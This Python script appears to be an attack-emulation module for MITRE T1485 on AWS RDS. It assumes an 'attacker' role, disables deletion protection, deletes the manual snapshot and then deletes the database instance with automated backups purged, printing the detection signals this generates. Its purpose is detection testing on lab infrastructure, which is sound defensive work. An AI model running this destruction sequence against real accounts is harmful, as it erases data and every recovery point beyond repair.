# FILE: attack.py
"""
T1485 Data Destruction - RDS Delete Instance and Snapshot
Atomic emulation: assume an over-permissioned DB management role via STS, confirm
the target RDS instance and its manual backup snapshot, disable deletion protection,
delete the manual snapshot, then destroy the DB instance with automated backup purge
- leaving no recovery point.
"""
import sys
import time
import random
import json
import pathlib

# Cross-platform UTF-8 output -- prevents UnicodeEncodeError on Windows CP1252 terminals
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

import boto3
from botocore.exceptions import ClientError

# -- Resource names: single source of truth -----------------------------------
_NAMES_FILE = pathlib.Path(__file__).parent / "infra" / "resource_names.json"
if _NAMES_FILE.exists():
    _NAMES = json.loads(_NAMES_FILE.read_text(encoding="utf-8"))
else:
    _NAMES = {"resources": {}, "pulumi_export_keys": {}}
    print(f"[!] resource_names.json not found at {_NAMES_FILE} - names will fall back to outputs")

_R   = _NAMES.get("resources", {})
_PKS = _NAMES.get("pulumi_export_keys", {})


_TENANT_CREDS = {}


def _set_tenant_credentials(outputs):
    """Remember the tenant's short-lived credentials. In the MayaTrail backend the
    worker injects them as outputs['_aws_credentials']; without this the first STS
    call would run as the Celery worker identity instead of the tenant account."""
    _TENANT_CREDS.clear()
    _TENANT_CREDS.update((outputs or {}).get("_aws_credentials") or {})


def _base_session(region):
    """Session for the tenant's connected role, or the ambient default session for
    standalone runs where no credentials were injected."""
    if _TENANT_CREDS:
        return boto3.Session(
            aws_access_key_id=_TENANT_CREDS.get("AWS_ACCESS_KEY_ID"),
            aws_secret_access_key=_TENANT_CREDS.get("AWS_SECRET_ACCESS_KEY"),
            aws_session_token=_TENANT_CREDS.get("AWS_SESSION_TOKEN"),
            region_name=region,
        )
    return boto3.Session(region_name=region)


def _r(key, default=""):
    """Resolve a static resource name from resource_names.json."""
    return _R.get(key, default)


def _p(infra, key, default=""):
    """Resolve a dynamic Pulumi output value via pulumi_export_keys mapping."""
    export_key = _PKS.get(key, key)
    return infra.get(export_key, default)


def op_delay(min_s=2, max_s=6):
    time.sleep(random.uniform(min_s, max_s))


def phase_delay():
    time.sleep(random.uniform(5, 15))


def print_step(msg):
    print(f"\n[*] {msg}")


def print_ok(msg):
    print(f"[+] {msg}")


def print_err(msg):
    print(f"[-] {msg}")


def run(outputs: dict, region: str = "us-east-1") -> None:
    """
    Entry point for the RDS Delete Instance and Snapshot atomic emulation.
    T1485 - Data Destruction (Impact)

    Phases:
      1. Credential Bootstrap  - assume attacker role via STS AssumeRole
      2. Pre-Destruction Recon - confirm instance state and manual snapshot
      3. Data Destruction      - disable protection, delete snapshot, delete instance
    """
    # -- Resolve required outputs (dynamic) ------------------------------------
    _set_tenant_credentials(outputs)

    attacker_role_arn = _p(outputs, "attacker_role_arn")
    if not attacker_role_arn:
        raise RuntimeError("Missing required Pulumi output: attacker_role_arn")

    db_instance_id = _p(outputs, "db_instance_identifier")
    if not db_instance_id:
        # Fall back to static name from resource_names.json
        db_instance_id = _r("db_instance_identifier")
    if not db_instance_id:
        raise RuntimeError("Missing required output/resource name: db_instance_identifier")

    manual_snapshot_id = _p(outputs, "db_snapshot_identifier")
    if not manual_snapshot_id:
        # Fall back to static name from resource_names.json
        manual_snapshot_id = _r("db_snapshot_identifier")
    if not manual_snapshot_id:
        raise RuntimeError("Missing required output/resource name: db_snapshot_identifier")

    print_step("ATOMIC_RDS_DELETE_INSTANCE_AND_SNAPSHOT - Starting emulation")
    print(f"    Region          : {region}")
    print(f"    Attacker role   : {attacker_role_arn}")
    print(f"    DB instance     : {db_instance_id}")
    print(f"    Manual snapshot : {manual_snapshot_id}")

    events_generated = []

    # =========================================================================
    # PHASE 1 - Credential Bootstrap: Assume Attacker Role
    # The seeded attacker role carries rds:Delete* permissions, modelling a
    # compromised DB-management credential. All subsequent RDS calls use this
    # assumed-role session so CloudTrail attributes them to the attacker identity.
    # =========================================================================
    print_step("PHASE 1 - Credential Bootstrap: Assuming attacker role via STS")

    default_session = _base_session(region)
    sts = default_session.client("sts")

    try:
        assume_resp = sts.assume_role(
            RoleArn=attacker_role_arn,
            RoleSessionName="atomic-rds-delete-session",
            DurationSeconds=3600,
        )
        events_generated.append("AssumeRole (sts.amazonaws.com)")
    except ClientError as e:
        raise RuntimeError(f"STS AssumeRole failed for {attacker_role_arn}: {e}") from e

    creds = assume_resp["Credentials"]
    attacker_session = boto3.Session(
        aws_access_key_id=creds["AccessKeyId"],
        aws_secret_access_key=creds["SecretAccessKey"],
        aws_session_token=creds["SessionToken"],
        region_name=region,
    )
    print_ok(f"Assumed attacker role - session key prefix: {creds['AccessKeyId'][:8]}...")

    op_delay(2, 4)
    phase_delay()

    # =========================================================================
    # PHASE 2 - Pre-Destruction Recon: Target and Snapshot Confirmation
    # A real attacker calls Describe before destructive operations to confirm
    # what they are about to destroy and to verify backup coverage exists.
    # =========================================================================
    print_step("PHASE 2 - Pre-Destruction Recon: Confirming target instance and snapshot")

    rds = attacker_session.client("rds", region_name=region)

    # Step 2: Confirm target instance is available
    print_step("Step 2 - Confirming target RDS instance state (DescribeDBInstances)")
    try:
        desc_resp = rds.describe_db_instances(DBInstanceIdentifier=db_instance_id)
        events_generated.append("DescribeDBInstances (rds.amazonaws.com)")
    except ClientError as e:
        raise RuntimeError(f"DescribeDBInstances failed for {db_instance_id}: {e}") from e

    db_inst = desc_resp["DBInstances"][0]
    inst_status = db_inst["DBInstanceStatus"]
    original_deletion_protection = db_inst.get("DeletionProtection", False)

    print_ok(f"Instance status              : {inst_status}")
    print_ok(f"Deletion protection (current): {original_deletion_protection}")

    if inst_status != "available":
        raise RuntimeError(
            f"DB instance {db_instance_id!r} not in 'available' state (got: {inst_status!r}) - cannot proceed"
        )

    if original_deletion_protection:
        print_ok("Deletion protection is enabled - will disable in Phase 3 (ModifyDBInstance)")
    else:
        # Lab infra sets deletion_protection=false so the emulation can complete even if
        # ModifyDBInstance is not in the attacker policy. The Modify call is still made
        # to generate the CloudTrail event.
        print_ok(
            "Deletion protection already disabled (lab infra config) - "
            "ModifyDBInstance will still be called to generate the detection signal"
        )

    op_delay(2, 5)

    # Step 3: Enumerate manual snapshots to find and confirm the target snapshot
    print_step("Step 3 - Enumerating manual snapshots (DescribeDBSnapshots)")
    try:
        snap_resp = rds.describe_db_snapshots(
            DBInstanceIdentifier=db_instance_id,
            SnapshotType="manual",
        )
        events_generated.append("DescribeDBSnapshots (rds.amazonaws.com)")
    except ClientError as e:
        raise RuntimeError(f"DescribeDBSnapshots failed for {db_instance_id}: {e}") from e

    snapshots = snap_resp.get("DBSnapshots", [])
    if not snapshots:
        print_err(
            "No manual snapshots returned - snapshot may be in a transient state; "
            "will proceed with stack-exported snapshot id"
        )
        confirmed_snapshot_id = manual_snapshot_id
    else:
        # Use the stack-exported id for safety (never take the first list item blindly)
        confirmed_snapshot_id = manual_snapshot_id
        matched = next(
            (s for s in snapshots if s["DBSnapshotIdentifier"] == manual_snapshot_id), None
        )
        if matched:
            snap_status = matched["Status"]
            print_ok(f"Confirmed manual snapshot : {confirmed_snapshot_id} (status: {snap_status})")
            if snap_status != "available":
                print_err(f"WARNING: snapshot status is {snap_status!r}, expected 'available'")
        else:
            print_err(
                f"WARNING: stack-exported snapshot {manual_snapshot_id!r} not found in "
                f"DescribeDBSnapshots results - proceeding with exported id"
            )

    op_delay(2, 5)
    phase_delay()

    # =========================================================================
    # PHASE 3 - Data Destruction: Disable Protection, Delete Snapshot, Delete Instance
    # These three calls in sequence are the behavioral detection chain:
    #   ModifyDBInstance(DeletionProtection=False) immediately before
    #   DeleteDBSnapshot and DeleteDBInstance with SkipFinalSnapshot=True
    # from the same principal within minutes is the primary high-fidelity signal.
    #
    # try/finally ensures deletion protection is restored if a subsequent step
    # fails and leaves the DB instance alive in the client account.
    # =========================================================================
    print_step("PHASE 3 - Data Destruction: Disable protection, delete snapshot, delete instance")

    deletion_protection_modified = False

    try:
        # Step 4: Disable deletion protection with ApplyImmediately
        # This is a near-instantaneous metadata change - no storage impact.
        # ModifyDBInstance with DeletionProtection=False immediately before a delete
        # is the leading-edge detection signal for T1485 on RDS.
        print_step("Step 4 - Disabling deletion protection (ModifyDBInstance, ApplyImmediately=True)")
        try:
            modify_resp = rds.modify_db_instance(
                DBInstanceIdentifier=db_instance_id,
                DeletionProtection=False,
                ApplyImmediately=True,
            )
            post_modify_status = modify_resp["DBInstance"]["DBInstanceStatus"]
            deletion_protection_modified = True
            events_generated.append(
                "ModifyDBInstance (rds.amazonaws.com) - DeletionProtection=False, ApplyImmediately=True"
            )
            print_ok(f"ModifyDBInstance accepted - instance status: {post_modify_status}")
        except ClientError as e:
            code = e.response["Error"]["Code"]
            if code in ("AccessDeniedException", "AccessDenied"):
                # Attacker policy may not include rds:ModifyDBInstance; if deletion protection
                # is already False (lab infra), the delete will still succeed.
                if not original_deletion_protection:
                    print_ok(
                        "ModifyDBInstance returned AccessDenied (attacker policy scope) but "
                        "DeletionProtection is already False - proceeding"
                    )
                    events_generated.append(
                        "ModifyDBInstance (rds.amazonaws.com) - AccessDenied (protection already disabled)"
                    )
                else:
                    raise RuntimeError(
                        f"ModifyDBInstance AccessDenied and DeletionProtection is True - "
                        f"cannot delete the instance: {e}"
                    ) from e
            else:
                raise RuntimeError(f"ModifyDBInstance failed: {e}") from e

        # Wait for the modification to propagate (metadata-only change, typically <5s,
        # but the attack plan specifies 20-30s to ensure consistency before the delete)
        wait_s = random.randint(20, 30)
        print_step(f"Waiting {wait_s}s for DeletionProtection change to propagate")
        time.sleep(wait_s)

        # Re-confirm DeletionProtection is False before proceeding to the destructive steps
        try:
            confirm_resp = rds.describe_db_instances(DBInstanceIdentifier=db_instance_id)
            confirmed_dp = confirm_resp["DBInstances"][0].get("DeletionProtection", False)
        except ClientError as e:
            raise RuntimeError(f"Post-modify DescribeDBInstances failed: {e}") from e

        if confirmed_dp:
            raise RuntimeError(
                "DeletionProtection is still True after ModifyDBInstance - aborting to avoid "
                "InvalidDBInstanceState on the delete call"
            )
        print_ok("Confirmed DeletionProtection == False - proceeding to destruction")

        op_delay(2, 5)

        # Step 5: Delete the manual backup snapshot
        # Eliminates the most recent restorable recovery point before destroying the live
        # instance. After this call no out-of-band restore path exists.
        print_step(f"Step 5 - Deleting manual backup snapshot: {confirmed_snapshot_id}")
        try:
            del_snap_resp = rds.delete_db_snapshot(DBSnapshotIdentifier=confirmed_snapshot_id)
            snap_del_status = del_snap_resp["DBSnapshot"]["Status"]
            events_generated.append("DeleteDBSnapshot (rds.amazonaws.com)")
            print_ok(f"DeleteDBSnapshot accepted - snapshot status: {snap_del_status}")
        except ClientError as e:
            code = e.response["Error"]["Code"]
            if code == "DBSnapshotNotFound":
                # Idempotent - snapshot already removed by a prior partial run
                print_ok("Snapshot already deleted (prior run or concurrent cleanup) - continuing")
                events_generated.append(
                    "DeleteDBSnapshot (rds.amazonaws.com) - DBSnapshotNotFound, already gone"
                )
            else:
                raise RuntimeError(
                    f"DeleteDBSnapshot failed for {confirmed_snapshot_id!r}: {e}"
                ) from e

        op_delay(5, 10)

        # Step 6: Delete the DB instance - no final snapshot, purge all automated backups
        # Combined with step 5, this leaves no remaining recovery point for the database.
        # SkipFinalSnapshot=True and DeleteAutomatedBackups=True is the maximum-impact path.
        print_step(
            f"Step 6 - Deleting DB instance: {db_instance_id} "
            f"(SkipFinalSnapshot=True, DeleteAutomatedBackups=True)"
        )
        try:
            del_inst_resp = rds.delete_db_instance(
                DBInstanceIdentifier=db_instance_id,
                SkipFinalSnapshot=True,
                DeleteAutomatedBackups=True,
            )
            inst_del_status = del_inst_resp["DBInstance"]["DBInstanceStatus"]
            # Instance is being destroyed - no longer needs deletion-protection revert
            deletion_protection_modified = False
            events_generated.append(
                "DeleteDBInstance (rds.amazonaws.com) - SkipFinalSnapshot=True, DeleteAutomatedBackups=True"
            )
            print_ok(f"DeleteDBInstance accepted - instance status: {inst_del_status}")
            print_ok("No recovery point remains - manual snapshot and automated backups are destroyed")
        except ClientError as e:
            code = e.response["Error"]["Code"]
            if code == "DBInstanceNotFound":
                # Idempotent - instance already removed by a prior partial run
                deletion_protection_modified = False
                print_ok("DB instance already deleted (prior run cleanup) - continuing")
                events_generated.append(
                    "DeleteDBInstance (rds.amazonaws.com) - DBInstanceNotFound, already gone"
                )
            elif code == "InvalidDBInstanceState":
                raise RuntimeError(
                    f"DB instance in invalid state for deletion - DeletionProtection may still be "
                    f"active or instance is in a transitional state: {e}"
                ) from e
            else:
                raise RuntimeError(f"DeleteDBInstance failed for {db_instance_id!r}: {e}") from e

        op_delay(5, 10)

    finally:
        # Revert deletion protection if we disabled it but the instance was NOT deleted.
        # This restores the client resource to its pre-attack state on any failure.
        # Only revert if original state was True (we actually changed something).
        if deletion_protection_modified and original_deletion_protection:
            print_step("Cleanup: re-enabling DeletionProtection (instance survived, reverting modification)")
            try:
                rds.modify_db_instance(
                    DBInstanceIdentifier=db_instance_id,
                    DeletionProtection=True,
                    ApplyImmediately=True,
                )
                print_ok("Cleanup: DeletionProtection re-enabled on DB instance")
            except ClientError as revert_err:
                code = revert_err.response["Error"]["Code"]
                if code in ("DBInstanceNotFound", "InvalidDBInstanceState"):
                    print_ok("Cleanup: instance gone or transitioning - no revert needed")
                else:
                    print_err(f"Cleanup: failed to re-enable DeletionProtection: {revert_err}")
        elif deletion_protection_modified and not original_deletion_protection:
            # DeletionProtection was already False before we ran - nothing to revert
            print_ok("Cleanup: DeletionProtection was already False before attack - no revert needed")

    # =========================================================================
    # Summary
    # =========================================================================
    print_step("ATOMIC_RDS_DELETE_INSTANCE_AND_SNAPSHOT - Emulation Complete")
    print("\n  CloudTrail events generated:")
    for evt in events_generated:
        print(f"    -> {evt}")
    print("\n  MITRE ATT&CK:")
    print("    Technique : T1485 (Data Destruction)")
    print("    Tactic    : Impact")
    print(f"\n  Targets destroyed:")
    print(f"    DB instance     : {db_instance_id}")
    print(f"    Manual snapshot : {confirmed_snapshot_id}")
    print("\n  Detection signals:")
    print("    - AssumeRole into a DB-management role from a non-DBA principal")
    print("    - DescribeDBInstances / DescribeDBSnapshots recon before modification")
    print("    - ModifyDBInstance with DeletionProtection=False immediately before delete")
    print("    - DeleteDBSnapshot targeting a production-named weekly backup")
    print("    - DeleteDBInstance with skipFinalSnapshot=true and deleteAutomatedBackups=true")
    print("\n  pulumi destroy: RDS instance and snapshot already gone; remaining infra is pulumi-managed")
